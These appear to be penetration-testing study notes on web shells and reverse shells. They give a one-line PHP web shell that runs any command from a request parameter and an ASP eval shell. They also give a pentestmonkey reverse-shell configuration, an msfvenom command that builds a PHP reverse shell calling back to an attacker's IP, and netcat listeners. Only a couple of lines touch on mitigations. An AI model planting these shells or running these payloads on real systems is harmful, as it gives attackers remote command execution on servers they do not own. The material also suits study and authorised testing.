## Web Shells
We want a good webshell for directory traversal or file transfer
- PHP: phpbash (https://github.com/Arrexel/phpbash)
- SecLists: /opt/useful/seclists/Web-Shells
- Simple manual web shell
```php
<?php system($_REQUEST['cmd']); ?>
```
- We can execute system commands with ?cmd= GET parameter
- Use source view [CTRL+U]
```asp (.NET)
<% eval request('cmd') %>
```

Security mitigations:
- WAF
- Prevent use of system()

## Reverse Shell
- PHP: https://github.com/pentestmonkey/php-reverse-shell
```php
$ip = 'OUR_IP';
$port = OUR_PORT;
```
```shell-session
nc -lvnp OUR_PORT
```

**Custom
```shell-session
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
nc -lvnp OUR_PORT
```
- 'p' flag is the payload
- 'f' flag is the output language

Reasons we may need to use web shell instead of reverse:
- Firewall does not allow outgoing connections
- Server disables necessary functions to initiate a connection back to us
